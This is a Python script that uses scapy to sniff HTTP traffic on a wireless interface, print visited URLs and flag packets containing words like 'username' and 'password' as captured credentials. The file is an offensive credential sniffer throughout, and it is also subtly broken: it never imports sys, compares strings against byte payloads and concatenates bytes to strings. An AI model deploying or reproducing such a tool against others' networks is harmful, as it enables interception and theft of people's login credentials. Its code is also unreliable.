#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


class Sniff:
    def __init__(self):
        self.packet = None
        self.keywords = None
        self.packet = None
        self.url = None

    def sniff(self, interface):
        scapy.sniff(iface=interface, store=False, prn=self.process_sniffed_packet)

    def get_url(self, packet):
        try:
            self.url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
            return self.url

        except Exception as e:
            print(f'\n[-] ERROR: {e}')
            sys.exit(0)

    def get_login_info(self, packet):
        try:
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                self.keywords = ["username", "user", "login", "password", "pass", "key"]
                for keyword in self.keywords:
                    if keyword in load:
                        return load

        except Exception as e:
            print(f'\n[-] ERROR: {e}')
            sys.exit(0)

    def process_sniffed_packet(self, packet):
        try:
            if packet.haslayer(http.HTTPRequest):
                url = self.get_url(packet)
                print("[+] HTTP Request >> " + url)

                login_info = self.get_login_info(packet)
                if login_info:
                    print("\n\n[+] Possible username/password >> " + login_info + "\n\n")

        except Exception as e:
            print(f'\n[-] ERROR: {e}')
            sys.exit(0)


if __name__ == '__main__':
    sniffer = Sniff()
    sniffer.sniff("wlan0")
